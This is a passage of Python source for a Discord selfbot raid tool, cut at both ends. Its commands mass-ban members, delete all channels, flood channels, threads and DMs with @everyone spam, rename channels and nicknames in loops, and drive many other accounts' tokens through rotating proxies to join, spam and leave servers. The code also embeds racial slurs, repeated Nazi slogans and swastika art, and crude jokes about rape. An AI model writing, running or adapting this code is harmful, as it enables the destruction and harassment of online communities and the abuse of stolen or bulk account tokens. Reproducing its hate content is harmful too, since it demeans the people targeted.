    "rules_channel_id": None,
    "public_updates_channel_id": None
}

a2 = {
    "features": ["COMMUNITY"],
    "preferred_locale": "en-US",
    "rules_channel_id": "1",
    "public_updates_channel_id": "1"
}

def CommunityFlood():
    global raid
    global Guild_ID
    raid == True
    while True:
        try:
            r = requests.patch(f"https://discord.com/api/v{random.randint(8, 9)}/guilds/{Guild_ID}", headers=headers, json=a2, proxies={"http": next(proxy_pool)})
            s = [200, 201, 204]
            if r.status_code in s:
                print("Created community")
            elif r.status_code == 429:
                b = r.json()
                print(f"Rate limited, retrying in {b['retry_after']} seconds")
                time.sleep(b['retry_after'])
            elif raid == False:
                break

        except:
            pass
        try:  
            r = requests.patch(f"https://discord.com/api/v{random.randint(8, 9)}/guilds/{Guild_ID}", headers=headers, json=a, proxies={"http": next(proxy_pool)})
            s = [200, 201, 204]
            if r.status_code in s:
                print("Disabled community")
            elif r.status_code == 429:
                b = r.json()
                print(f"Rate limited, retrying in {b['retry_after']} seconds")
                time.sleep(b['retry_after'])
            elif raid == False:
                break
        except:
            pass


def Audit_Hang():
    for i in range(8):
        t = threading.Thread(target=CommunityFlood)
        t.start()

@migatte.command()
async def audithang(ctx):
    global Guild_ID
    try:
        await ctx.message.delete()
    except:
        pass
    Guild_ID = ctx.guild.id
    Audit_Hang()


niggas = []
with open("idslol.txt", "r", encoding="UTF-8") as ids:
    idiots = ids.read().splitlines()
    for niggers in idiots:
        niggas.append(niggers)

def MassBan(i):
    r = requests.put(f"https://discord.com/api/v9/guilds/{Guild_ID}/bans/{i}", headers=headers, proxies={"http": next(proxy_pool)})
    if r.status_code == 200:
        print("UWU") 
    elif r.status_code == 429:
        time.sleep(r.json()['retry_after'])

def Ban_Spam():
    for i in niggas:
        print(i)
        t = threading.Thread(target=MassBan, args=(i,))
        t.start()

@migatte.command()
async def banspam(ctx):
    global Guild_ID
    try:
        await ctx.message.delete()
    except:
        pass
    Guild_ID = ctx.guild.id
    try:
        l = await ctx.send("[**Warning**] Using this on your account may get your account banned it's recommended to use it on a bot,  do you wanna use it anyway? [Answer in the console]")
        d = input("""
╔════════════╗
║Yes %sor%s No %s>%s""" % (red(), reset(), magenta(), reset()))
        if d in Answers:
            Ban_Spam()
        else:
            await l.delete()
    except:
        pass

async def deletechannels_worker(queue):
    global raid
    raid = True
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                channel = queue.get_nowait()
                try:
                    request = await session.delete(f"https://discordapp.com/api/v9/channels/{channel.id}", headers=headers, ssl=False)
                except:
                    pass
                if request.status == 200:
                    print(f"Deleted Channel - {channel}")
                    queue.task_done()
                elif request.status == 429:
                    json = await request.json()
                    print(f"Rape limited")
                    await asyncio.sleep(json['retry_after'])
                    queue.put_nowait(channel)
                elif request.status in [401, 404, 403]:
                    return
                elif raid == False:
                    break
                await session.close()
        except:
            pass

@migatte.command()
async def q_del(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    queue = asyncio.Queue()
    for channel in ctx.guild.channels:
        queue.put_nowait(channel)
        print(f"Queuing all channels..")
    tasks = []
    for x in range(10):
        task = asyncio.create_task(deletechannels_worker(queue))
        tasks.append(task)
    await queue.join()
    for task in tasks:
        task.cancel()


def thread_():
    global raid
    raid = True
    good_statues = [200, 201, 204]
    try:
        while True:
            r = requests.post(f"https://discord.com/api/v9/channels/{canale_id}/threads", headers=headers, json={"auto_archive_duration": "1440", "location": "Plus Button", "name": f"Heil Takaso", "type": "11"}, proxies={"http": next(proxy_pool)})
            c = r.json()
            if r.status_code in good_statues:
                try:
                    a = requests.post(f"https://discord.com/api/v9/channels/{c['id']}/messages", headers=headers, json={"content": ggaf}, proxies={"http": next(proxy_pool)})
                    f = a.json()
                    if a.status_code == 429:
                        time.sleep(f['retry_after'])
                except:
                    pass
            elif r.status_code == 429:
                time.sleep(c['retry_after'])
            elif raid == False:
                break
            else:
                print(r.json())
    except:
        pass

def subarashi_speed():
    for i in range(3):
        t = threading.Thread(target=thread_)
        t.start()

@migatte.command()
async def limit_break(ctx, *, arg = None):
    global ggaf
    global canale_id
    if arg == None:
        ggaf = "Heil Takaso"
    else:
        ggaf = arg 
    try:
        await ctx.message.delete()
    except:
        pass
    canale_id = ctx.channel.id
    subarashi_speed()


@migatte.command()
async def perfect_raid(ctx, *, arg = None):
    global raid
    raid = True
    try:
        await ctx.message.delete()
    except:
        pass
    if arg == None:
        a = "@everyone"
    else:
        a = arg
    while raid:
        if raid == False:
            break
        try:
            lol = await random.choice(ctx.guild.channels).send(a)
            try:
                await lol.delete()
            except:
                pass
        except:
            pass

cnicks = ["Sus", "Takaso doge", "heil takaso", "takaso is op", "takasus", "NEGRO", "cazzo", "sieg heil takaso", "Tak"]


@migatte.command()
async def cnick(ctx, ID = None):
    global raid
    raid = True
    try:
        await ctx.message.delete()
    except:
        pass
    if ID == None:
        try:
            while raid:
                    guild = ctx.guild.id
                    payload = {
                        "nick": random.choice(cnicks),
                    }
                    r = requests.patch(f"https://discord.com/api/v9/guilds/{guild}/members/@me", headers=headers, json=payload, proxies={"http": next(proxy_pool)})
                    if r.status_code == 200:
                        print("Changed nickname")
                    elif r.status_code == 429:
                        json = r.json()
                        print("Rape limited")
                        await asyncio.sleep(json['retry_after'])
                    elif raid == False:
                        break
                    else:
                        break
        except:
            pass
    else:
        try:
            while raid:
                    guild = ctx.guild.id
                    payload = {
                        "nick": random.choice(cnicks),
                    }
                    r = requests.patch(f"https://discord.com/api/v9/guilds/{guild}/members/{ID}", headers=headers, json=payload, proxies={"http": next(proxy_pool)})
                    if r.status_code == 200:
                        print("Changed nickname")
                    elif r.status_code == 429:
                        json = r.json()
                        print("Rape limited")
                        await asyncio.sleep(json['retry_after'])
                    elif raid == False:
                        break
                    else:
                        break
        except:
            pass


@migatte.command()
async def copy_messages(ctx, ID = None):
    global Channel_ID
    Channel_ID = ID
    try:
        await ctx.message.delete()
    except:
        pass
    if ID == None:
        s = await ctx.send("Insert an ID.")
        time.sleep(4)
        await s.delete()
    else:
        r = requests.get(f"https://discord.com/api/v9/channels/{Channel_ID}/messages", headers=headers, proxies={"http": next(proxy_pool)})
        jsonn = json.loads(r.text)
        for value in jsonn:
            try:
                await ctx.send(f"```\nName: {value['author']['username']}, Message: {value['content']}\n```")
            except:
                pass

@migatte.command()
async def edit(ctx, *, arg = None):
    if arg == None:
        new_content = "."
    else:
        new_content = arg
    messages = await ctx.channel.history(limit=None).flatten()
    for message in messages:
        try:
            await message.edit(content=new_content)
        except:
            pass


emoji = "😀😃😄😁😆😅😂🤣☺️😊😇🙂🙃😉😌😍🥰😘😗😙😚😋😛😝😜🤪🤨🧐🤓😎🤩🥳😏😒😞😔😟😕🙁☹️😣😖😫😩🥺😢😭😤😠😡🤬🤯😳🥵🥶😱😨😰😥😓🤗🤔🤭🤫🤥😶😐😑😬🙄😯😦😧😮😲🥱😴🤤😪😵🤐🥴🤢🤮🤧😷🤒🤕🤑🤠😈👿👹👺🤡💩👻💀☠️👽👾🤖🎃😺😸😹😻😼😽🙀😿😾🤲👐🙌🏻👏🏻🤝👍🏻👎👊✊🤛🤞🏼✌️🤟🏻🤘🏻👌🏻🤏👈🏻👉🏻👆🏼👇🏻☝️✋🏻🤚🖐🖖🏿👋🏻🤙🏼💪🏼🦾🖕🏻✍🏼🙏🏻🦶🦵🦿💄💋👄🦷👅👂🦻👃👣👁👀🧠🗣👤👥👶🏼👧🏻🧒👦🏻👩🏻🧑🏻👨👩‍🦱🧑‍🦱👨‍🦱👩‍🦰🧑‍🦰👨‍🦰👱‍♀️👱👱‍♂️👩‍🦳🧑‍🦳👨‍🦳👩‍🦲🧑‍🦲👨‍🦲🧔👵🏼🧓👴👲👳‍♀️👳‍♂️🧕👮‍♀️👮👮‍♂️👷‍♀️👷👷‍♂️💂‍♀️💂💂‍♂️🕵️‍♀️🕵️🕵️‍♂️👩🏼‍⚕️🧑‍⚕️👨‍⚕️👩‍🌾🧑‍🌾👨‍🌾👩‍🍳🧑‍🍳👨‍🍳👩‍🎓🧑‍🎓👨‍🎓👩‍🎤🧑🏿‍🎤👨🏼‍🎤👩‍🏫🧑‍🏫👨‍🏫👩‍🏭🧑‍🏭👨‍🏭👩‍💻🧑‍💻👨‍💻👩‍💼🧑‍💼👨‍💼👩‍🔧🧑‍🔧👨‍🔧👩‍🔬🧑‍🔬👨‍🔬👩‍🎨🧑‍🎨👨‍🎨👩‍🚒🧑‍🚒👨‍🚒👩‍✈️🧑‍✈️👨‍✈️👩‍🚀🧑‍🚀👨‍🚀👩‍⚖️👨‍⚖️🧑‍⚖️👰🤵👸🏻🤴🏻🦸🏼‍♀️🦸🦸🏻‍♂️🦹‍♀️🦹🦹‍♂️🤶🎅🏼🧙‍♀️🧙🧙‍♂️🧝‍♀️🧝🧝‍♂️🧛‍♀️🧛🧛‍♂️🧟‍♀️🧟🧟‍♂️🧞‍♀️🧞🧞‍♂️🧜🏻‍♀️🧜🧜‍♂️🧚🏼‍♀️🧚🧚‍♂️👼🏼🤰🤱🙇🏻‍♀️🙇🙇‍♂️💁‍♀️💁💁‍♂️🙅🏻‍♀️🙅🙅‍♂️🙆‍♀️🙆🙆‍♂️🙋‍♀️🙋🙋‍♂️🧏‍♀️🧏🧏‍♂️🤦🏻‍♀️🤦‍♂️🤷🏻‍♀️🤷🤷🏽‍♂️🙎🏻‍♀️🙎🙎‍♂️🙍🏻‍♀️🙍🙍‍♂️💇🏻‍♀️💇💇‍♂️💆🏻‍♀️💆💆‍♂️🧖‍♀️🧖🧖‍♂️🤳💃🏻🕺🏻👯‍♀️👯👯‍♂️🕴👩‍🦽👩‍🦽🧑‍🦽👨‍🦽👩‍🦼🧑🏿‍🦼👨‍🦼🚶‍♀️🚶🚶‍♂️👩‍🦯🧑‍🦯👨‍🦯🧎‍♀️🧎🧎‍♂️🏃‍♀️🏃🏃‍♂️🧍‍♀️🧍🧍‍♂️👫👩🏼‍🤝‍👩🏻👬👩‍❤️‍👨👩‍❤️‍👩👨‍❤️‍👨👩‍❤️‍💋‍👨👩‍❤️‍💋‍👩👨‍❤️‍💋‍👨👨‍👩‍👦👨‍👩‍👧👨‍👩‍👧‍👦👨‍👩‍👦‍👦👨‍👩‍👧‍👧👩‍👩‍👦👩‍👩‍👧👩‍👩‍👧‍👦👩‍👩‍👦‍👦👩‍👩‍👧‍👧👨‍👨‍👦👨‍👨‍👧👨‍👨‍👧‍👦👨‍👨‍👦‍👦👨‍👨‍👧‍👧👩‍👦👩‍👧👩‍👧‍👦👩‍👦‍👦👩‍👧‍👧👨‍👦👨‍👧👨‍👧‍👦👨‍👦‍👦👨‍👧‍👧🧶🧵🧥🥼🦺👚👕👖🩲🩳👔👗👙👘🥻🩱🥿👠👡👢👞👟👟🧦🧤🧣🎩🧢👒🎓⛑👑💍👝👜👛💼🎒🧳👓🕶🥽🌂🐶🐱🐭🐹🐰🦊🐻🐼🐨🐯🦁🐮🐷🐽🐸🐵🙈🙉🙊🐒🐔🐧🐦🐤🐣🐥🦆🦅🦉🦇🐺🐗🐴🦄🐝🐛🦋🐌🐞🐜🦟🦗🕷🕸🦂🐢🐍🦖🦎🦕🐙🦑🦐🦞🦀🐡🐠🐟🐬🐳🐋🦈🐊🐅🐆🦓🦍🦧🐘🦛🦏🐪🐫🦒🦘🐃🐂🐄🐎🐖🐏🐑🦙🐐🦌🐕🐩🦮🐕‍🦺🐈🐓🦃🦚🦜🦢🦩🕊🐇🦝🦨🦡🦦🦥🐁🐀🐿🦔🐾🐉🐲🌵🎄🌲🌳🌴🌱🌿☘️🍀🎍🎋🍃🍂🍁🍄🐚🌾💐🌷🌹🥀🌺🌸🌼🌻🌞🌝🌛🌜🌚🌕🌖🌗🌘🌑🌒🌓🌔🌙🌎🌍🌏🪐💫⭐️🌟✨⚡️☄️💥🔥🌪🌈☀️🌤⛅️🌥☁️🌦🌧⛈🌩🌨❄️☃️⛄️🌬💨💧💦☔️☂️🌊🌫🍏🍎🍐🍊🍋🍌🍉🍇🍓🍈🍒🍑🥭🍍🥥🥝🍅🍆🥑🥦🥬🥒"

@migatte.command()
async def emoji_flood(ctx):
    global chan
    global stop
    stop = True
    try:
        await ctx.message.delete()
    except:
        pass
    finally:
        chan = ctx.channel.id
    godspam3()

def godspambase_3():
    global chan
    global stop
    payload = {
        "content" : f"{emoji} @everyone"
        }
    try:
        while True:
            r = requests.post(f"https://discord.com/api/v9/channels/{chan}/messages", headers=headers, data=payload, proxies={"http": next(proxy_pool)})
            if stop == False:
                break    
    except:
        pass


def godspam3():
    threads = []
    for i in range(5):
        t = threading.Thread(target=godspambase_3)
        threads.append(t)
        t.start()

@migatte.command()
async def nazi(ctx):
  global raid
  raid = True
  await ctx.message.delete()
  nazi=discord.Embed(title="""
🟥🟥🟥🟥🟥🟥🟥🟥🟥 
🟥⬜⬜⬜⬜⬜⬜⬜🟥 
🟥⬜⬛⬜⬛⬛⬛⬜🟥 
🟥⬜⬛⬜⬛⬜⬜⬜🟥 
🟥⬜⬛⬛⬛⬛⬛⬜🟥 
🟥⬜⬜⬜⬛⬜⬛⬜🟥
🟥⬜⬛⬛⬛⬜⬛⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜🟥 
🟥🟥🟥🟥🟥🟥🟥🟥🟥
SIEG HEIL TAKASO!
  """, description="""
  
 ...╚🔥 🔥╝...
          ╚═(卐卐卐)═╝
           ╚═(卐卐卐)═╝
            ╚═(卐卐卐)═╝
             ╚═(卐卐卐)═╝
              ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
              ╚═(卐卐卐)═╝
             ╚═(卐卐卐)═╝
            ╚═(卐卐卐)═╝
           ╚═(卐卐卐)═╝
          ╚═(卐卐卐)═╝
         ╚═(卐卐卐)═╝
        ╚═(卐卐卐)═╝
       ╚═(卐卐卐)═╝
      ╚═(卐卐卐)═╝
     ╚═(卐卐卐)═╝
    ╚═(卐卐卐)═╝
   ╚═(卐卐卐)═╝
  ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
  ╚═(卐卐卐)═╝
   ╚═(卐卐卐)═╝
    ╚═(卐卐卐)═╝
     ╚═(卐卐卐)═╝
      ╚═(卐卐卐)═╝
       ╚═(卐卐卐)═╝
        ╚═(卐卐卐)═╝
         ╚═(卐卐卐)═╝
           ╚═(卐卐卐)═╝          
             ╚═(卐卐卐)═╝
              ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
              ╚═(卐卐卐)═╝
             ╚═(卐卐卐)═╝
            ╚═(卐卐卐)═╝
           ╚═(卐卐卐)═╝
          ╚═(卐卐卐)═╝
         ╚═(卐卐卐)═╝
        ╚═(卐卐卐)═╝
       ╚═(卐卐卐)═╝
      ╚═(卐卐卐)═╝
     ╚═(卐卐卐)═╝
    ╚═(卐卐卐)═╝
   ╚═(卐卐卐)═╝
  ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
  ╚═(卐卐卐)═╝
   ╚═(卐卐卐)═╝
    ╚═(卐卐卐)═╝
     ╚═(卐卐卐)═╝
      ╚═(卐卐卐)═╝
       ╚═(卐卐卐)═╝
🇩🇪            🇩🇪🇩🇪🇩🇪🇩🇪
🇩🇪            🇩🇪
🇩🇪            🇩🇪
🇩🇪🇩🇪🇩🇪🇩🇪🇩🇪🇩🇪🇩🇪
                  🇩🇪            🇩🇪
                  🇩🇪            🇩🇪
🇩🇪🇩🇪🇩🇪🇩🇪            🇩🇪
⠀⠀⠀⠀⢀⣴⠶⠿⠟⠛⠻⠛⠳⠶⣄⡀⠀⠀⠀⠀⠀⠀ ⠀⠀⣠⣶⣿⣿⣿⣶⣖⠶⢶⣤⡀⠀⠈⢿⣆⠀⠀⠀⠀⠀ ⢀⣴⣿⠋⠉⠉⠀⠀⠈⠉⠛⠿⢿⣷⡀⠀⠈⢷⡀⠀⠀⠀ ⡾⠉⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢦⡀⠘⣷⡀⠀⠀ ⣷⢰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⡀⢸⡇⠀⠀ ⢻⡜⡄⠀⢀⣀⣤⣶⣶⡄⣴⣾⣿⣛⣓⠀⠀⣧⢸⣇⠀⠀ ⢈⣧⣧⠀⢩⠞⠿⠿⠻⠀⠘⠙⠃⠛⠛⠓⠀⣿⣻⠿⣷⠀ ⢸⡵⣿⠀⠀⠀⠀⠀⠀⠀⠀⠠⡀⠀⠀⠀⠀⠀⢻⣇⡟⠀ ⠘⢧⣿⡀⠀⠀⠀⠀⢧⣤⣤⣶⣗⠀⠀⠀⠀⠀⠜⣽⠁⠀ ⠀⠈⢿⣧⠀⠀⠀⠀⣿⣿⣿⣿⣿⣀⠀⠀⠀⢠⡟⠁⠀⠀ ⠀⠀⠀⠘⣇⠀⠀⠰⠋⠉⠙⠂⠀⠉⠀⠀⠀⣼⡅⠀⠀⠀ ⠀⠀⠀⠀⠹⣦⡀⠀⠀⠀⠉⠉⠁⠀⠀⠀⣠⠏⢻⣤⡀⠀ ⠀⠀⠀⠀⠀⢹⡷⢦⣄⣀⣀⣀⣀⣤⣴⡾⠃⠀⠘⡿⠙⢶ ⠀⠀⠀⠀⠀⢨⡷⣤⡀⠈⠉⠉⢁⡴⠋⠀⠀⠀⣸⠃⠀⠀
🟥🟥🟥🟥🟥🟥🟥🟥🟥 
🟥⬜⬜⬜⬜⬜⬜⬜🟥 
🟥⬜⬛⬜⬛⬛⬛⬜🟥 
🟥⬜⬛⬜⬛⬜⬜⬜🟥 
🟥⬜⬛⬛⬛⬛⬛⬜🟥 
🟥⬜⬜⬜⬛⬜⬛⬜🟥
🟥⬜⬛⬛⬛⬜⬛⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜🟥 
🟥🟥🟥🟥🟥🟥🟥🟥🟥
  """, color=0xffffff)
  nazi.set_thumbnail(url="https://media.discordapp.net/attachments/704402813035479105/788428836181901342/image0-32.gif")
  nazi.set_image(url="https://media.discordapp.net/attachments/857290386518442078/860990642716278854/image0-4-3-1.gif")
  nazi.set_footer(text="卐 SIEG HEIL TAKASO, LMFAO 卐",icon_url="https://media.discordapp.net/attachments/704402813035479105/788428836181901342/image0-32.gif") 
  while raid:
    try:
        await ctx.send(f"@everyone 卐 Flooded by Takaso ☠" + 'ﾠﾠ'+'\n' * 300 + 'ﾠﾠ', embed=nazi)
    except:
        pass
    if raid == False:
        break


cnames = ["Sus", "Takaso doge", "heil takaso", "takaso is op", "takasus", "NEGRO", "cazzo", "sieg heil takaso"]

@migatte.command()
async def cname(ctx, ID = None):
    global raid
    raid = True
    try:
        await ctx.message.delete()
    except:
        pass
    if ID == None:
        try:
            m = await ctx.send("You forgot the channel ID.")
            await asyncio.sleep(4)
            await m.delete()
        except:
            pass
    else:
        try:
            while raid:
                    payload = {
                        "name": random.choice(cnames),
                        "type": "0",
                        "topic": "heil takaso"
                    }
                    r = requests.patch(f"https://discord.com/api/v9/channels/{ID}", headers=headers, json=payload, proxies={"http": next(proxy_pool)})
                    if r.status_code == 200:
                        print("Changed name")
                    elif r.status_code == 429:
                        json = r.json()
                        print("Rape limited")
                        await asyncio.sleep(json['retry_after'])
                    elif raid == False:
                        break
                    else:
                        break
        except:
            pass

@migatte.command()
async def calm(ctx):
    global raid
    global stop
    global auto_purge
    stop = False
    raid = False
    auto_purge = False
    try:
        await ctx.message.delete()
    except:
        pass  
    with open("calm.mp4", "rb") as f:
        await ctx.send("```py\nSuccesfully killed 'all' running tasks.\n```", file=File(f, "calm.mp4"))


@migatte.command()
async def category(ctx, *, category_id = None):
    global checkweb
    global raid
    raid = True
    checkweb = True
    try:
        await ctx.messagge.delete()
    except:
        pass
    global serwer
    serwer = str(ctx.guild.id)
    if category_id == None:
        print("You forgot the category id.")
    else:
        threadchan_category(category_id)

def chanflood_category(category_id):
    global raid
    raid = True
    payload = {
        "name": "sesso",
        "type": "0",
        "parent_id": f"{category_id}"
    }
    try:
        while raid:
            r = requests.post(f"https://discord.com/api/v9/guilds/{serwer}/channels", headers=headers, json=payload, proxies={"http": next(proxy_pool)})
            if r.status_code == 429:
                s = r.json()
                time.sleep(s['retry_after'])
            elif raid == False:
                break
    except:
        pass

def threadchan_category(category_id):
    threads = []
    for i in range(15):
        t = threading.Thread(target=chanflood_category, args=(category_id,))
        threads.append(t)
        t.start()    

def pin_msg(c_id, msg_id):
    headers = {
        "Authorization":usertoken
        }
    r = requests.put(
        f"https://discord.com/api/v9/channels/{c_id}/pins/{msg_id}", headers=headers, proxies={"http": next(proxy_pool)})
    if r.status_code == 429:
        l = r.json()
        time.sleep(l['retry_after'])


def id_scraper(Channel_ID):
    headers = {
        "Authorization": usertoken
    }

    r = requests.get(
        f"https://discord.com/api/v9/channels/{Channel_ID}/messages", headers=headers)
    jsonn = r.json()
    for m in jsonn:
        a = m['id']
        pin_msg(Channel_ID, a)

@migatte.command()
async def masspin(ctx):
    p = ctx.channel.id
    await ctx.message.delete()
    threading.Thread(target=id_scraper, args=(p,)).start()

@migatte.command()
async def kaioken(ctx):
    global kaio
    kaio = True
    await ctx.message.delete(); await ctx.send(f"**Kaioken!**\n{embed_handle}https://migatte.nogokui.repl.co/kaio.html", 
    embed=discord.Embed(color=0xf22534).set_image(url="https://thumbs.gfycat.com/AfraidNippyBlowfish-size_restricted.gif"), delete_after=5
    )



@migatte.command()
async def revert(ctx):
    global kaio
    kaio = False
    await ctx.message.delete(); await ctx.send(f"{embed_handle}https://migatte.nogokui.repl.co/nogokui.html", delete_after=5)



def joiner(lol):
    global invite_link
    try:
        headers = {"authorization": lol}
        r = requests.post(f"https://discord.com/api/v9/invites/{invite_link}", headers=headers, proxies={"http": next(proxy_pool)})
        if r.status_code == 200:
            print(" [%s-%s] %sSuccesfully joined.%s" % (green(), reset(), green(), reset()))
        elif r.status_code == 429:
            m = r.json()
            print(" [%s-%s] Rape Limited" % (red(), reset()))
            time.sleep(m['retry_after'])
        else:
            print(" [%s-%s] Failed to Join." % (red(), reset()))
    except:
        pass


def leaver(lol):
    global guild_id
    try:
        headers = {"authorization": lol}
        r = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers=headers, proxies={"http": next(proxy_pool)})
        if r.status_code == 204:
            print(f" [%s-%s] %sSuccesfully leaved - {guild_id}.%s" % (green(), reset(), green(), reset()))
        elif r.status_code == 429:
            m = r.json()
            print(" [%s-%s] Rape Limited" % (red(), reset()))
            time.sleep(m['retry_after'])
        else:
            print(" [%s-%s] Failed to leave." % (red(), reset()))
    except:
        pass


def tokens_rip(lol):
    try:
        headers = {"authorization": lol}
        payload = {"content": messaggio}
        payload1 = {"recipients": [user_id]}
        try:
            r = requests.post(f"https://discord.com/api/v9/users/@me/channels", json=payload1, headers=headers, proxies={"http": next(proxy_pool)})
            if r.status_code == 429:
                m = r.json()
                print(" [%s-%s] Rape Limited" % (red(), reset()))
                time.sleep(m['retry_after'])
        except:
            pass
        jsonn = r.json()
        sussy = jsonn['id']
        try:
            while True:
                r = requests.post(f"https://discord.com/api/v9/channels/{sussy}/messages", json=payload, headers=headers, proxies={"http": next(proxy_pool)})
                if r.status_code == 200:
                    print(" [%s-%s] %sSent message.%s" % (green(), reset(), green(), reset()))
                elif r.status_code == 429:
                    m = r.json()
                    print(" [%s-%s] %sRape Limited%s" % (red(), reset(), red(), reset()))
                    time.sleep(m['retry_after'])
                else:
                    print(" [%s/%s] %sFailed to send message.%s" % (magenta(), reset(), magenta(), reset()))
                    break
        except:
            pass
    except:
        pass


def server_rip(lol):
    headers = {"Authorization": lol}
    try:
        payload = {"content": messaggio}
        try:
            while True:
                r = requests.post(f"https://discord.com/api/v9/channels/{channel_op}/messages", json=payload, headers=headers, proxies={"http": next(proxy_pool)})
                if r.status_code == 200:
                    print(" [%s-%s] %sSent message.%s" % (green(), reset(), green(), reset()))
                elif r.status_code == 429:
                    m = r.json()
                    print(" [%s-%s] %sRape Limited%s" % (red(), reset(), red(), reset()))
                    time.sleep(m['retry_after'])
                else:
                    print(" [%s/%s] %sFailed to send message.%s" % (magenta(), reset(), magenta(), reset()))
                    break
        except:
            pass
    except:
        pass


def DMspam():
    threads = []
    for lol in bakas:
        t = threading.Thread(target=tokens_rip, args=(lol,))
        threads.append(t)
        t.start()

@migatte.command()
async def tokendm(ctx, userid, messagge="Heil Takaso", opzion = "no"):
    global messaggio
    global user_id
    global opzione 
    await ctx.message.delete()
    user_id = userid
    opzione = opzion
    messaggio = message
    DMspam()
  

@migatte.command()
async def tokenspam(ctx, *, mess="@everyone"):
    global raid
    global channel_op
    global messaggio
    messaggio = mess
    raid = True
    channel_op = ctx.message.channel.id
    await ctx.message.delete()
    threads = []
    for lol in bakas:
        t = threading.Thread(target=server_rip, args=(lol,))
        threads.append(t)
        t.start()
        if raid == False:
            break


@migatte.command()
async def tokenjoin(ctx, invite):
    global invite_link
    invite_link = invite
    await ctx.message.delete()
    threads = []
    for lol in bakas:
        t = threading.Thread(target=joiner, args=(lol,))
        threads.append(t)
        t.start()

@migatte.command()
async def tokenleave(ctx):
    global guild_id
    guild_id = ctx.guild.id
    await ctx.message.delete()
    threads = []
    for lol in bakas:
        t = threading.Thread(target=leaver, args=(lol,))
        threads.append(t)
        t.start()



def thread_flood_token(lol):
    global raid
    raid = True
    headers = {"Authorization": lol}
    good_statues = [200, 201, 204]
    try:
        while True:
            r = requests.post(f"https://discord.com/api/v9/channels/{canale_id}/threads", headers=headers, json={"auto_archive_duration": "1440", "location": "Plus Button", "name": f"Heil Takaso", "type": "11"}, proxies={"http": next(proxy_pool)})
            c = r.json()
            if r.status_code in good_statues:
                try:
                    a = requests.post(f"https://discord.com/api/v9/channels/{c['id']}/messages", headers=headers, json={"content": ggaf}, proxies={"http": next(proxy_pool)})
                    f = a.json()
                    if a.status_code == 429:
                        time.sleep(f['retry_after'])
                except:
                    pass
            elif r.status_code == 429:
                time.sleep(c['retry_after'])
            elif raid == False:
                break
            else:
                print(r.json())
    except:
        pass

def subarashi_speed_token():
    for lol in bakas:
        t = threading.Thread(target=thread_flood_token, args=(lol,))
        t.start()

@migatte.command()
async def limitbreak_x20(ctx, *, arg = None):
    global raid
    global ggaf
    global canale_id
    raid = True
    if arg == None:
        ggaf = "Heil Takaso @everyone"
    else:
        ggaf = arg 
    try:
        await ctx.message.delete()
    except:
        pass
    canale_id = ctx.channel.id
    while raid:
        subarashi_speed_token()

restore_c = []
delete_chansesso = []
@migatte.command()
async def fnuke(ctx, id_role = None):
    global checkweb
    global target_role
    checkweb = True
    if id_role == None:
        target_role = ctx.guild.default_role
    else:
        for role in ctx.guild.roles:
            if int(role.id) == int(id_role):
                target_role = role
    await ctx.message.delete()
    for c in ctx.guild.channels:
        await c.set_permissions(target_role, read_messages=False)
        restore_c.append(c)
    for i in range(50):
        a = await ctx.guild.create_text_channel("nuked-by-leondev")
        delete_chansesso.append(a)

@migatte.command()
async def restore(ctx):
    await ctx.message.delete()
    for m in restore_c:
        await m.set_permissions(target_role, read_messages=True)
    for s in delete_chansesso:
        await s.delete()

async def taskpool_spam(lol):
    global a
    try:
        async with aiohttp.ClientSession(headers={"Authorization": lol}) as sesso:
            async with sesso.post(f"https://discord.com/api/v9/channels/{Channel_ID}/messages", json={"content": halal}) as resesso:
                if resesso.status == 200:
                    print(f"Sent message")
                elif resesso.status == 429:
                    op = resesso.json(); await asyncio.sleep(op['retry_after'])
    except Exception as exsesso:
        print(exsesso)
        pass

async def start_taskpool():
    for x in range(500):
        async with TaskPool(1_000) as pool:
            for lol in bakas:
                await pool.put(taskpool_spam(lol))

@migatte.command()
async def token_taskpool(ctx, *, message = None):
    global halal
    global Channel_ID
    if message == None:
        halal = "@everyone"
    else:
        halal = message
    Channel_ID = ctx.message.channel.id
    await ctx.message.delete(); await start_taskpool()

@migatte.command()
async def massadd(ctx):
    while True:
        requests.put("https://discord.com/api/v9/channels/925849533362090024/recipients/853249187822436354", headers=headers, json={})

@migatte.command()
async def nextline(ctx):
    global raid
    raid = True
    try:
        await ctx.message.delete()
    except:
        pass
    gc_id1 = ctx.message.channel.id
    while True:
            try:
                r = requests.get(f"https://discord.com/api/v9/channels/{gc_id1}/messages?limit=1", headers=headers, proxies={"http": next(proxy_pool)}); e = r.json()
                if r.status_code in [a for a in range(200, 300)]:
                    for w in e:
                        message = str(w['content'])
                        channel_id = w['channel_id']
                        id = str(w['author']['id'])
                else:
                    print("Rate limited, or not found.")
                    break
            except:
                print("Rate limited, or outside group.")
                break
            if id != str(migatte.user.id):
                await ctx.send(f"Your next line is: {message}")
                break
            if raid == False:
                break
            else:
                pass
    
@migatte.command()
async def pedo(ctx):
    global raid
    raid = True
    try:
        await ctx.message.delete()
    except:
        pass
    gc_id1 = ctx.message.channel.id
    while True:
            try:
                r = requests.get(f"https://discord.com/api/v9/channels/{gc_id1}/messages?limit=1", headers=headers, proxies={"http": next(proxy_pool)}); e = r.json()
                if r.status_code in [a for a in range(200, 300)]:
                    for w in e:
                        message = str(w['content'])
                        channel_id = w['channel_id']
                        id = str(w['author']['id'])
                elif r.status_code == 429:
